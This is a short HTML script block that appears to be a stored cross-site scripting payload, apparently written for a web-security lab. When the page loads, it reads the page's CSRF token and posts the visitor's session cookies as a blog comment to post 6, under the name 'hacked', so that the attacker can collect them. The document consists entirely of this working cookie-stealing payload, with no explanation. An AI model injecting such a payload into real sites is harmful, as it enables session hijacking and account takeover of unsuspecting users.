<script>
window.addEventListener('DOMContentLoaded', function() {

var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('comment', document.cookie);
data.append('postId', 6);
data.append('name', 'hacked');
data.append('email', 'hacked@hacked.com');
data.append('website', 'https://www.hacked.com');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
});
</script>